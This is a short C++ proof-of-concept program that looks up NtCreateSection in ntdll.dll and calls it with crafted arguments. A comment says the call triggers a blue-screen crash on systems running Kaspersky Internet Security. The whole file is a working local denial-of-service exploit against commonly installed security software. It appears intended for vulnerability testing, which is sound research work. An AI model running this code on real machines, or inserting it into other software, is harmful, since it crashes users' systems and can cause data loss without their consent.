// CrSectVuln.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

typedef
DWORD (NTAPI *t_fNtCreateSection)(DWORD a,DWORD b,DWORD c,DWORD d,DWORD e,DWORD f,DWORD g);

int _tmain(int argc, _TCHAR* argv[])
{
	printf("\ntesting KAV/KIS vulnerability on NtCreateSection, be ready for BSOD..\n");

	Sleep(1000);

	HMODULE hModule = GetModuleHandleW( L"ntdll.dll" );
	if (hModule == NULL) 
		return -1;

	t_fNtCreateSection NtCreateSection;
	NtCreateSection = (t_fNtCreateSection) GetProcAddress(hModule, "NtCreateSection");
	if (NtCreateSection==NULL)
		return -1;
	NtCreateSection(0,0,0,0,0,0,32); // this line raise bsod with active kis

	printf("test passed.\n");

	return 0;
}

